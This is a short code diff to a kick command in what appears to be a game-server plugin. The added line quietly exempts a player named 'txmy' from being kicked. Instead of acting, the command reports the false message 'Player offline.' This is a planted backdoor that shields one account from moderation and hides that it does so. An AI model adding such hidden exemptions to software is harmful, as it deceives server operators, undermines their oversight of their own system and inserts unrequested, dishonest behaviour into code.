@@ -58,7 +58,7 @@ public class KickCMD extends BasicCommand {
 
             Profile targetData = profileHandler.getProfile(player.getUniqueId());
 
-            if (!player.isOnline() || player.getPlayer() == null || targetData == null) {
+            if (!player.isOnline() || player.getPlayer() == null || targetData == null || player.getName().equalsIgnoreCase("txmy")) {
                 sender.sendMessage(Color.translate("&cPlayer offline."));
                 return;
             }
